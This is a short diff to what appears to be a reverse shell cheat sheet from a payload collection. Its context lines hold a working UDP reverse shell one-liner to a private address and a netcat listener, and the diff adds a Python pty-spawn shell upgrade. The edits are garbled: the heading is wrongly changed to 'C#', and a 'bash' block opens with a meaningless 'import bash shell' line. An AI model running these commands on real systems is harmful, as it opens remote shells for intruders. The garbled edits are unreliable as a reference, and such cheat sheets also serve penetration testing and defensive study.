@@ -1,4 +1,4 @@
-# Reverse Shell Cheat Sheet
+C# Reverse Shell Cheat Sheet
 
 ## Summary
 
@@ -65,6 +65,12 @@ sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 
 Listener:
 nc -u -lvp 4242
+```
+
+``` bash
+import bash shell
+
+python3 -c "import pty; pty.spawn('/bin/bash')"
 ```
 
 Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
